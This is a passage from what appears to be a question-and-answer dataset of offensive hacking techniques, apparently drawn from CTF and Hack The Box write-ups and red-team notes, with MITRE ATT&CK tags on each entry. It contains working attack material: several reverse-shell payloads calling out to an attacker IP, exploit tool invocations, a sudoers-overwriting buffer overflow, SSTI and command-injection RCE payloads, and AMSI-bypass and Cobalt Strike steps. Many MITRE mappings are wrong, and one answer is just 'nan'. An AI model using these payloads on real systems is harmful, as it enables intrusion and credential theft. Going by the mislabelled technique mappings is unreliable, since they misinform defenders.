git clone https://github.com/gteissier/xdebug-shell
cd xdebug-shell
python2 -m pip install defusedxml

Then, execute the exploit script as follows:

./xdebug-shell.py --local-host=172.30.0.9 --url=http://172.20.0.10/info.php

This will allow you to execute commands remotely on the target system. MITRE References: MITRE ID is T1588.001, MITRE Name is: Obtain Capabilities: Exploits, and MITRE Tactics are: Resource Development.

## Q: How can you exploit the phuip-fpizdam vulnerability in the Nginx and PHP-FPM configuration to achieve remote code execution?
A: To exploit the phuip-fpizdam vulnerability, you can use the phuip-fpizdam tool. First, download the tool using Go:

go get github.com/neex/phuip-fpizdam
cd ~/go/bin/

Then, execute the tool against the target URL:

./phuip-fpizdam http://172.20.0.10:8000/index.php

The exploit suggests that you can execute commands by appending ?a= to the URL followed by the command. For example:

curl http://172.20.0.10:8000/index.php/?a=id

This will execute the 'id' command on the remote system. Note that the exploit depends on the Nginx worker process, so you may need to try multiple times to get the correct worker. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use a PATH hijacking vulnerability to escalate privileges to root?
A: To exploit the PATH hijacking vulnerability, you can create a malicious 'easyrsa' script and place it in the /tmp directory. The script should copy the /bin/bash binary to /tmp/bash, and set the SUID bit on it. Then, you can execute the ersatool binary, which will use the malicious 'easyrsa' script, resulting in a root shell.

First, create the 'easyrsa' script locally with the following contents:

#!/bin/bash
cp /bin/bash /tmp/bash
chmod 4755 /tmp/bash

Then, use Python's HTTP server to serve the file and download it to the remote host:

python3 -m http.server 8888
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://192.168.254.2:8888/easyrsa","easyrsa")'
chmod +x /tmp/easyrsa

Finally, execute the previously created Python exploit for ersatool to trigger the vulnerability:

python3 exploit.py

This will result in a root shell, as the /tmp/bash binary now has the SUID bit set. MITRE References: MITRE ID is T1546.001, MITRE Name is: Event Triggered Execution: Registry Run Keys / Startup Folder, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can you abuse Constrained Delegation to gain administrative privileges on a domain controller?
A: To abuse Constrained Delegation to gain administrative privileges on a domain controller, follow these steps:1. Obtain the password hash of a user account that has the 'AllowedToDelegate' permission on the domain controller.2. Use the getST.py script from impacket to request a Service Ticket (ST) for the 'Administrator' user, impersonating the user with the 'AllowedToDelegate' permission:   getST.py -spn WWW/dc.DOMAIN.htb -impersonate Administrator DOMAIN.htb/USERNAME -hashes HASH3. Export the obtained Kerberos ticket as ADMINISTRATOR.ccache:   export KRB5CCNAME=ADMINISTRATOR.ccache4. Use the wmiexec.py script from impacket to execute commands on the domain controller as the 'Administrator' user:   wmiexec.py -k -no-pass dc.DOMAIN.htb MITRE References: MITRE ID is T1558, MITRE Name is: Kerberoasting, and MITRE Tactics are: Credential Access, Privilege Escalation.

## Q: How can you bypass mutual authentication used to protect an administrative dashboard?
A: One common misconfiguration that can be used to bypass mutual authentication is Nginx path normalization. If the dashboard is protected by a rule like `if ($ssl_client_verify != SUCCESS) { return 403; }`, you can try accessing the dashboard using a normalized path like `/admin;foo=bar/dashboard` which Nginx will parse as `/admin;foo=bar/dashboard` but Tomcat will resolve as `/admin/dashboard`, bypassing the authentication check. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you leverage Ansible to read arbitrary files on a target system?
A: Ansible playbooks typically verify the syntax of the provided playbook. If you provide an invalid playbook file as input, Ansible will include the contents of the file in the error message, allowing you to read arbitrary files like `/etc/shadow`. You can create a malicious playbook that tries to include a nonexistent file, and Ansible will print the contents of the file you specify in the error. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can FTP logs be poisoned to achieve remote code execution via LFI?
A: By enabling the 'log_ftp_protocol' option in the vsftpd configuration, all FTP login attempts are logged. We can then craft a malicious username containing PHP code to execute when the logs are read via LFI. For example, we can use '<?php system("/bin/bash -c 'bash -i &>/dev/tcp/10.10.14.3/7777 0>&1'"); ?>' as the username to get a reverse shell. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, TA0006.

## Q: How can Django hash cracking be used to extract and crack user credentials from the application?
A: The application was written in Django, and the developer was incorrectly storing user passwords using a weak hashing algorithm (MD5). By extracting the hashed passwords from the database, the attacker could then use tools like hashcat to crack the passwords using wordlists. Once the passwords were cracked, the attacker could use the valid credentials to authenticate as the corresponding users and gain further access to the system. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you perform banner grabbing on a Subversion (svn server)?
A: You can perform banner grabbing on a Subversion (svn server) using the following command: `nc -vn 10.10.10.10 3690`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0002, Execution.

## Q: What techniques were used to bypass the process restrictions on the target machine?
A: The target machine had a task running that would kill any active Netcat connections or connections that interact with bash and sh. This was worked around by copying the nc and bash binaries to the /tmp directory, or by using a PHP-based shell saved to the uploads directory. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How were the audio files used to obtain the password for the xalvas user?
A: The /home/xalvas directory contained two audio files, recov.wav and rick.wav. By importing these files into Audacity or a similar program and inverting one of the tracks, a password was revealed. The password audio was cut in half, with the start of the password being at the end of the track. Playing the track on a loop provided the full password. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How can you perform a Python Pickle Deserialization attack against a Sentry server to gain remote code execution?
A: Sentry is a web application that manages web application errors and can be vulnerable to Python Pickle Deserialization attacks. By finding a secret key exposed in Sentry's debug output, an attacker can craft a malicious serialized Python object and change the cookie's contents to execute arbitrary commands on the server. This can be done by modifying the example code from the Sentry RCE vulnerability disclosure to use the found secret key and a command to execute a reverse shell. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: How can you reverse engineer a Rust application to extract the hardcoded encryption key, nonce, and ciphertext to decrypt the application's password?
A: By decompiling the Rust application in a tool like Ghidra, an attacker can locate the AES-CTR encryption functions and variables containing the hardcoded key, nonce, and ciphertext. They can then write a Python script using the cryptography library to decrypt the ciphertext and extract the application's password. This allows the attacker to authenticate to the application and gain a root shell. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: What is Execution After Redirect (EAR) and how can it be used to gain unauthorized access to a web application?
A: Execution After Redirect (EAR) is a web application vulnerability that occurs when a user is redirected to a new URL without actually being authenticated. This allows the attacker to directly access the redirected URL and potentially bypass authentication measures. To exploit EAR, the attacker can capture the redirect request in a tool like Burp Suite, then modify the request to access the redirected URL without following the redirect. This can allow the attacker to access functionality or pages that should be restricted to authenticated users. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What is PHP's exec() function and how can it be abused to achieve remote code execution on a web server?
A: The exec() function in PHP allows the execution of system commands on the server. If user inputs are not properly sanitized before being passed to the exec() function, an attacker can inject malicious commands and achieve remote code execution on the server. To exploit this, the attacker can craft a payload that gets passed to the exec() function, such as a URL-encoded bash one-liner to spawn a reverse shell. Proper input validation and sanitization is crucial to prevent this type of attack. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you perform PATH hijacking to escalate privileges on a Linux system?
A: PATH hijacking is a privilege escalation technique where an attacker modifies the PATH environment variable to include a directory they control. This allows the attacker to execute malicious programs with the privileges of the target user. To perform PATH hijacking, the attacker can create a malicious executable with the same name as a legitimate program called by a script running with elevated privileges. By placing the malicious executable in a directory that comes before the legitimate program's location in the PATH, the malicious executable will be executed instead. This can allow the attacker to gain root privileges on the system. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use Gobuster to brute-force directories on a web server?
A: To use Gobuster to brute-force directories on a web server, follow these steps:1. Run the command:   `gobuster dir -u <target_url> -w <wordlist_file> -o <output_file> -t <threads>`2. Replace `<target_url>` with the URL of the web server you want to scan.3. Replace `<wordlist_file>` with the path to a wordlist file containing common directory names (e.g. `/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`).4. Replace `<output_file>` with the name of the file you want to save the Gobuster output to.5. Replace `<threads>` with the number of concurrent threads you want Gobuster to use (e.g. 50).Gobuster is a fast directory/file enumeration tool that can help you discover hidden or unexpected web content on a target server. The brute-force approach using a wordlist is a common technique for web application testing and penetration testing. MITRE References: MITRE ID is T1593, MITRE Name is: Search Open Websites/Domains, and MITRE Tactics are: Discovery.

## Q: How can you use the CVE-2021-3129 exploit to achieve remote code execution on a vulnerable Laravel application?
A: To use the CVE-2021-3129 exploit to achieve remote code execution on a vulnerable Laravel application, follow these steps:1. Clone the exploit script from the GitHub repository: `git clone https://github.com/nth347/CVE-2021-3129_exploit.git`2. Change into the exploit directory: `cd CVE-2021-3129_exploit`3. Make the exploit script executable: `chmod +x exploit.py`4. Run the exploit script, passing in the target URL and your reverse shell command:   `./exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9001 >/tmp/f'`5. This will trigger the remote code execution vulnerability and establish a reverse shell connection back to your local machine on port 9001.The CVE-2021-3129 exploit targets a deserialization vulnerability in the Monolog logging library used by Laravel versions 8.4.2 and earlier when running in debug mode. It allows an unauthenticated attacker to execute arbitrary commands on the server. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use Python's Pdb debugger to escalate privileges on a system?
A: The Python Pdb debugger can be used to escalate privileges if it is run with elevated permissions. If a Python script is executed with sudo, and an error is triggered that causes Pdb to start, the debugger will run with root privileges. This allows an attacker to execute arbitrary Python commands within the Pdb shell, including spawning a root shell. To exploit this, an attacker can look for Python scripts that are executed with sudo permissions and try to trigger an error, causing Pdb to start and provide a root-level Python interpreter. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: What technique can be used to achieve root access on the Gobox machine?
A: To achieve root access on the Gobox machine, you can leverage the Nginx backdoor. 1. Enumerate the running processes and identify the Nginx process running on localhost port 8000.2. Research the 'Command: on' option in the Nginx configuration, which indicates the use of the NginxExecute module.3. Use the module's functionality to execute arbitrary commands on the server, such as 'curl -g "http://192.168.18.22/?ippsec.run[id]"'.4. Modify the command to match the actual parameter name used in the module (ippsec instead of system) to achieve root code execution. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004 - Privilege Escalation.

## Q: How can you exploit a Cross-Site Scripting (XSS) vulnerability in a web form to gain initial access to a system?
A: To exploit a Cross-Site Scripting (XSS) vulnerability in a web form, you can try injecting your malicious payload in request headers like the Referer header. This can allow you to execute JavaScript on the victim's browser and potentially force the client to retrieve sensitive information from an internal system, like an email server, and exfiltrate it to your attacker-controlled server. For example, you can create a script.js file that sends an HTTP GET request to retrieve the contents of a protected page and then posts the response to your listener using an XMLHttpRequest. Then, set the Referer header in the web form submission to include a <script> tag that references your script.js file. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript, and MITRE Tactics are: Execution.

## Q: How can you exploit a Server Side Template Injection (SSTI) vulnerability in a web application?
A: To exploit an SSTI vulnerability, you can try injecting malicious payloads into input fields that are then rendered on the server-side. For example, in the Bolt machine, the update name feature was vulnerable to SSTI. You could update your username to '{{ 7*7 }}' and see the output of the payload rendered on the page. To gain remote code execution, you can use a payload like '{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}' to execute system commands. Set up a listener and a Python HTTP server to deliver the payload and get a reverse shell. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you escalate privileges by leveraging a Passbolt configuration file?
A: In the Bolt machine, the Passbolt configuration file '/etc/passbolt/passbolt.php' contained database credentials for the 'passbolt' user. By spraying these credentials across different services, you were able to gain access to the 'eddie' user over SSH. From there, you could search for private keys and use them to recover the administrative account in Passbolt, allowing you to view the root password stored in the application. MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: Credential Access.

## Q: How can you exploit a command injection vulnerability in the pets service to gain a reverse shell?
A: To exploit the command injection vulnerability in the pets service, you can craft a malicious payload and inject it into the species field of the JSON data sent to the /api/pet endpoint. For example:curl -X POST -d '{"name":"Test pet","species":"dog;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzkwMDEgMD4mMSAK|base64 -d|bash","characteristics":"corgi"}' -H "'Content-Type': 'application/json'" "http://pets.devzat.htb/api/pet"This will execute the base64 encoded reverse shell command and give you a shell as the user patrick. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you exploit the authentication bypass vulnerability in InfluxDB to dump the database contents?
A: To exploit the authentication bypass vulnerability in InfluxDB version 1.7.5, you can create a valid JWT token with an empty secret and use it to query the database. First, use a tool like jwt.io to generate a token with the following payload:{  "exp": 1681430400,  "username": "admin"}Then, you can use curl to query the database and dump the contents of the "user" table:curl -G $url --data-urlencode "db=devzat" --data-urlencode "q=SELECT * FROM \"user\"" -H "Authorization: Bearer $token"This will allow you to retrieve the credentials for the user catherine. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you exploit the Local File Inclusion (LFI) vulnerability in the dev chat application to read the root SSH key?
A: To exploit the LFI vulnerability in the dev chat application, you can use the "file" command and provide a malicious path to read the root SSH key. The correct password for the "file" command is hardcoded as "CeilingCatStillAThingIn2021?".You can use the following path to read the root SSH key:../.../../../../../root/.ssh/id_rsaThis will allow you to retrieve the root SSH key and use it to log in as the root user. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you perform a Padding Oracle Attack to obtain administrator access to a web application?
A: To perform a Padding Oracle Attack, we can use the PadBuster tool. First, we need to identify a potential vulnerability by changing a character in the session cookie value and observing the response for an "Invalid padding" error. Then, we can use PadBuster to decrypt the cookie value and forge a new cookie for the admin user. For example:

padbuster http://10.10.11.119/login.php Yscs8CrCF%2BU4NyQHNNtqv2wH9wcb0Ty1 8 -cookie auth=Yscs8CrCF%2BU4NyQHNNtqv2wH9wcb0Ty1

This will decrypt the cookie value and allow us to forge a new cookie for the admin user to gain access to the application. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you exploit an SQL Injection vulnerability to retrieve credentials and gain access to a second web application?
A: To exploit an SQL Injection vulnerability, we can use sqlmap to list the available databases and tables, and then dump the contents of the relevant tables. For example:

sqlmap -u "http://10.10.11.119/home/logs.php?name=admin" --cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA" --dbs
sqlmap -u "http://10.10.11.119/home/logs.php?name=admin" --cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA" -D cmsmsdb --tables
sqlmap -u "http://10.10.11.119/home/logs.php?name=admin" --cookie "auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA" -D cmsmsdb -T cms_users --dump

This allows us to retrieve the credentials for the second web application, which we can then use to gain access. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: TA0009 - Collection.

## Q: How can you leverage write access to the /etc/hosts file to achieve lateral movement on the target system?
A: If we have write access to the /etc/hosts file, we can add an entry for a custom domain that points to our attacker-controlled system. This allows us to redirect the target system to our malicious server and execute a payload. For example:

echo "10.10.14.18 taskmanage.overflow.htb" >> /etc/hosts

We can then create a malicious script on our server and wait for the target system to retrieve and execute it. MITRE References: MITRE ID is T1096, MITRE Name is: Code Signing, and MITRE Tactics are: TA0005 - Defense Evasion.

## Q: How can you exploit a buffer overflow vulnerability in a setuid binary to escalate privileges to root?
A: To exploit a buffer overflow vulnerability in a setuid binary, we can use a debugger like gdb to find the offset for overwriting the EIP register and the address of a useful function, such as the encrypt() function in the file_encrypt binary. We can then craft a payload that overwrites the EIP with the address of the encrypt() function, which can be used to overwrite the /etc/sudoers file and gain root privileges. For example:

cd /tmp
echo "tester ALL=(ALL) NOPASSWD:ALL" > /tmp/sudoers
echo "-202976456" > /tmp/input
python3 -c 'print("A"*44 +"\x5b\x58\x55\x56")' >> /tmp/input
echo "/tmp/sudoers" >> /tmp/input
echo "/tmp/sudoenc" >> /tmp/input
/opt/file_encrypt/file_encrypt < /tmp/input

This allows us to overwrite the /etc/sudoers file and gain full sudo rights. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0005 - Defense Evasion.

## Q: How can the behavior of AmsiScanBuffer be modified to bypass AMSI detection?
A: Since amsi.dll is loaded into the memory space of the current process, its behavior can be modified by overwriting instructions in memory. This can be done by finding the memory address of the AmsiScanBuffer function, making the memory region writable, and then patching the function to simply return an HRESULT of E_INVALIDARG without actually scanning the provided buffer. This will cause the API to report the content as not detected, bypassing AMSI protection. The Malleable C2 'amsi_disable' directive in Cobalt Strike automates this process for common post-exploitation commands. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can inline hooking be detected and bypassed?
A: Inline hooking can be detected by examining the memory of a process and looking for the patched 'jmp' instructions that redirect execution to the EDR\'s detour code. Tools like Process Hacker or WinDbg can be used to inspect process memory and identify hooked APIs. To bypass inline hooking, techniques like manual DLL injection, direct system calls, or API unhooking can be used to execute code without triggering the EDR\'s monitoring. MITRE References: MITRE ID is T1121, MITRE Name is: Regsvr32, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can Hashcat be used to perform a mask attack?
A: Hashcat can be used to perform a mask attack by specifying the -a 3 option to enable the mask attack mode. The mask is then defined using the following character sets: ?l (lowercase), ?u (uppercase), ?d (digits), ?s (specials). For example, the command "hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d" would perform a mask attack targeting a password that starts with an uppercase letter, followed by 7 lowercase letters, and ends with a digit. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can an attacker use PortBender, reverse port forwarding, and a SOCKS proxy to enable NTLM relay attacks against the AD CS services?
A: On the attacker-controlled server (SRV-1), the attacker can use PortBender to redirect incoming traffic on port 445 to port 8445, start a reverse port forward to forward traffic hitting port 8445 to the team server on port 445, and start a SOCKS proxy for ntlmrelayx to send traffic back into the network. This setup enables the attacker to perform NTLM relay attacks against the AD CS services. MITRE References: MITRE ID is T1090.003, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control, Lateral Movement.

## Q: How can QueueUserAPC be used to execute shellcode in a process?
A: QueueUserAPC is an API that can be used to execute shellcode in a process. There are two main ways to use it:

1. Spawn a process in a suspended state, queue the APC on the primary thread, and then resume the process.
2. Enumerate the threads of an existing process and queue the APC on one of them, either by waiting for the thread to enter an alerted state or by forcing the thread to enter an alerted state.

The first option of spawning a process is the most straight-forward. You create the process in a suspended state, write the shellcode into the target process, call QueueUserAPC to queue the APC on the primary thread, and then resume the thread to execute the shellcode. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can the `Get-RemoteMachineAccountHash` function from the DAMP project be used to retrieve the machine account hash from a compromised system?
A: The `Get-RemoteMachineAccountHash` function from the DAMP project can be used to retrieve the machine account hash from a compromised system. This hash can be used to generate a Silver Ticket, which can be used to authenticate to services on the target system without requiring the user's password. MITRE References: MITRE ID is T1550.002, MITRE Name is: Pass the Hash, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: What can a keylogger be used to capture?
A: A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive data. MITRE References: MITRE ID is T1056.001, MITRE Name is: Input Capture: Keylogging, and MITRE Tactics are: Collection, Credential Access.

## Q: How can you view the captured keystrokes from the keylogger?
A: All keystrokes can be seen at View > Keystrokes. For example, the output shows keystrokes captured from the Google Chrome browser, including the URL "http://srv-1" and the password "Sup3rman". MITRE References: MITRE ID is T1056.001, MITRE Name is: Input Capture: Keylogging, and MITRE Tactics are: Collection, Credential Access.

## Q: How can you stop the keylogger job?
A: The keylogger runs as a job that can be stopped with the `jobkill` command. For example, `beacon> jobkill 1` would stop the job with ID 1. MITRE References: MITRE ID is T1562.001, MITRE Name is: Impair Defenses: Disable or Modify Tools, and MITRE Tactics are: Defense Evasion.

## Q: How can you generate a payload using Cobalt Strike to execute a stageless Windows executable?
A: To generate a stageless Windows executable payload with Cobalt Strike, go to Attacks > Packages > Windows Executable (S). Select the HTTP listener you created previously, choose Windows EXE as the output, and tick Use x64. Cobalt Strike will generate a 64-bit stageless payload that you can save to C:\Payloads and execute to establish a new Beacon session. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: Execution.

## Q: How can you perform privilege escalation on a Linux system using vulnerable kernel exploits?
A: To perform privilege escalation on a Linux system using vulnerable kernel exploits, you can search for known kernel vulnerabilities that allow local privilege escalation. Some common techniques include searching for and exploiting CVEs related to kernel version, configuration, or driver issues. Once a suitable vulnerability is identified, you can compile and run a corresponding kernel exploit to gain root privileges. However, it's important to exercise caution and thoroughly understand the risks involved before attempting such actions. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: What are some techniques for bypassing web application firewalls (WAFs) during a penetration test?
A: To bypass web application firewalls (WAFs) during a penetration test, you can try techniques like input obfuscation, using alternative HTTP methods, exploiting vulnerabilities in the WAF itself, or leveraging misconfigured WAF rules. For example, you can try URL encoding, using Unicode characters, or splitting payloads across multiple parameters to evade WAF detection. Additionally, you can test for vulnerabilities in the WAF software or configuration that could allow you to bypass its protections. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use the Hydra tool to perform password guessing attacks against a web application or remote service?
A: Hydra is a popular tool for performing password guessing attacks, also known as brute-force attacks. To use Hydra to guess passwords for a web application or remote service, you can run a command like the following:

hydra -l <username> -P <wordlist_file> <target_ip_address> <service>

This command will use Hydra to test a list of passwords (specified in the wordlist_file) against the target system and service, attempting to gain unauthorized access. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can I automate file enumeration and reconnaissance on a target web server?
A: You can use the tool 'dirb' to perform automated directory and file enumeration on a target web server. Dirb will send a wordlist of common file and directory names to the target and report back any files or directories that are found. This can help identify sensitive files, backup archives, or other potentially exploitable resources on the web server. Some example commands are: 

dirb http://target.com /path/to/wordlist.txt
dirb http://target.com -r (recursive search)
dirb http://target.com -o output.txt (save results to file) MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: What techniques can I use to bypass web application firewalls (WAFs) during a penetration test?
A: There are a few techniques that can be used to bypass web application firewalls during a penetration test:

1. URL obfuscation - Modify the URL structure or parameter names to bypass WAF string matching
2. Request smuggling - Send crafted HTTP requests to exploit vulnerabilities in the WAF or web server
3. Vulnerability exploitation - Identify and exploit vulnerabilities in the WAF software to bypass security controls
4. Blind SQLi - Use techniques like UNION-based or boolean-based injection to bypass WAF SQL filtering
5. Evasion via encoding - Encode payloads using techniques like Unicode, hex, or other unconventional encodings MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: What are some techniques for enumerating users and identifying valid accounts on a target system?
A: Techniques for enumerating users and identifying valid accounts include:- Querying the target system's authentication services (e.g., Active Directory, LDAP) to list all user accounts.- Searching for patterns in usernames based on common naming conventions.- Brute-forcing login forms with common username and password combinations.- Reviewing logs, system files, and other artifacts for references to user accounts.- Leveraging social engineering techniques to obtain valid user credentials. MITRE References: MITRE ID is T1087, MITRE Name is: Account Discovery, and MITRE Tactics are: Discovery.

## Q: How can you maintain access to a compromised system after initial exploitation?
A: To maintain access to a compromised system after initial exploitation, techniques include:- Installing backdoors or remote access tools (RATs) to regain entry.- Escalating privileges to gain higher-level access and persistence.- Abusing scheduled tasks, startup scripts, or other mechanisms to achieve persistence.- Disabling security controls or logging to avoid detection.- Exfiltrating sensitive data or establishing command and control channels. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: What are some techniques for performing privilege escalation on a compromised Linux system?
A: Techniques for Linux privilege escalation include exploiting kernel vulnerabilities, abusing misonfigured setuid/setgid binaries, leveraging weak file permissions, and taking advantage of sudoers misconfiguration. Tools like LinEnum, LinPEAS, and Juicy Potato can be used to automate the process. The MITRE ATT&CK technique 'Exploitation for Privilege Escalation' (T1068) is relevant for this task. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: What are some common techniques used in Capture the Flag (CTF) competitions to bypass or escalate file permissions?
A: Common techniques used in CTF competitions to bypass or escalate file permissions include: using the SUID or SGID bit to execute commands with elevated privileges, exploiting misconfigured cron jobs or services running with root privileges, and abusing weak file permissions to read or modify sensitive files. Participants may also search for world-writable directories or files that can be used to escalate privileges. MITRE References: MITRE ID is T1548.002, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: TA0004, TA0005.

## Q: What are some common techniques used in Capture the Flag (CTF) events to gain access to systems or retrieve flags?
A: nan MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can I use Metasploit to exploit vulnerabilities and gain access to a target system?
A: Metasploit is a comprehensive framework for exploiting vulnerabilities and gaining access to target systems. To use Metasploit effectively, follow these general steps:1. Identify the target system and the vulnerabilities present using reconnaissance tools like Nmap.2. Search the Metasploit module database for an appropriate exploit module that matches the target's vulnerabilities.3. Configure the exploit module with the necessary options, such as the target's IP address and any required payload.4. Launch the exploit and monitor the output for a successful connection to the target system.5. Once access is gained, you can then perform further post-exploitation activities, such as privilege escalation, lateral movement, or data exfiltration.Metasploit is a powerful tool, but it should only be used in an authorized and ethical manner, such as during a security assessment or penetration test. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: What is the purpose of the SNMP service and how can it be used to extract sensitive information from a network device?
A: The Simple Network Management Protocol (SNMP) is a protocol used to manage and monitor network devices. It can be used to extract sensitive information from devices that have an SNMP service running. SNMP uses community strings which act as a password. The default community string is often 'public'. By using the snmpwalk command, an attacker can enumerate the SNMP service and extract information such as device details, configuration, and potentially sensitive data. For example, on the Antique machine the SNMP service disclosed a printer password that could be used to access the telnet service. MITRE References: MITRE ID is T1201, MITRE Name is: Access Tool Repository, and MITRE Tactics are: TA0009.

## Q: What are some HTTP verbs/methods that can be used to bypass 403 and 401 errors?
A: Try using different verbs to access the file: GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK. Check the response headers, maybe some information can be given. For example, a 200 response to HEAD with Content-Length: 55 means that the HEAD verb can access the info. You still need to find a way to exfiltrate that info. Using a HTTP header like X-HTTP-Method-Override: PUT can overwrite the verb used. Use the TRACE verb and if you are very lucky maybe in the response you can see also the headers added by intermediate proxies that might be useful. MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Reconnaissance.

## Q: What HTTP headers can be used to bypass 403 and 401 errors?
A: Change the Host header to some arbitrary value, try using different User-Agents, fuzz HTTP headers like X-Originating-IP, X-Forwarded-For, X-Original-URL, etc. If the page is behind a proxy, try abusing HTTP Request Smuggling or hop-by-hop headers. You can also try removing the Host header. MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Reconnaissance.

## Q: What path traversal techniques can be used to bypass 403 and 401 errors?
A: If the path is blocked, try using /%2e/path (URL encoded), %ef%bc%8f/path (Unicode bypass), or other path bypasses like /secret/, /secret/., //secret//, /.;/secret, etc. For APIs, try parameter pollution with user_id=ATTACKER_ID&user_id=VICTIM_ID. MITRE References: MITRE ID is T1505, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: What other techniques can be used to bypass 403 and 401 errors?
A: Get the IP or CNAME of the domain and try contacting it directly. Try to stress the server sending common GET requests. Change the protocol from http to https, or for https to http. Check if the file was worldwide accessible in the past using https://archive.org/web/. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What tools can be used to automate 403 and 401 bypasses?
A: Some tools that can be used include byp4xx, bypass-403, forbiddenpass, Burp Extension - 403 Bypasser, and Forbidden Buster. MITRE References: MITRE ID is T1588, MITRE Name is: Obtain Capabilities, and MITRE Tactics are: Resource Development.

## Q: How can an attacker leverage a command injection vulnerability in a web application to gain remote access?
A: An attacker can exploit a command injection vulnerability by injecting malicious commands into input fields that are passed unsanitized to the underlying system. This can allow the attacker to execute arbitrary commands on the remote server, potentially leading to a reverse shell or other remote access. Tools like Burp Suite can be used to identify and test for command injection flaws. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can core dumps be leveraged to extract sensitive data from a vulnerable SUID binary?
